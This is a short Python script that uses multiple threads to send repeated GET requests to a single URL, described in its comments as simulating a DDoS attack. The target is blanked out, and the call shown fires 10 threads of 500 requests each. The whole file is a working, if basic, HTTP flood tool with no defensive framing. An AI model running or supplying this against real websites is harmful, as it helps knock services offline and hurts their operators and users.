import threading
import requests

# Function to send multiple requests to a given URL


def send_requests(url, num_requests):
    for _ in range(num_requests):
        response = requests.get(url)
        # Print response status code
        print('response code:', response.status_code)

# Function to simulate a DDoS attack


def simulate_DDoS(url, num_threads, num_requests):
    threads = []

    # Create and start multiple threads to send requests
    for _ in range(num_threads):
        thread = threading.Thread(
            target=send_requests, args=(url, num_requests))
        threads.append(thread)
        thread.start()

    # Wait for all threads to finish
    for thread in threads:
        thread.join()


# Simulate a DDoS attack on the specified URL using 10 threads and sending 500 requests each
simulate_DDoS('https://www.____.com/', 10, 500)
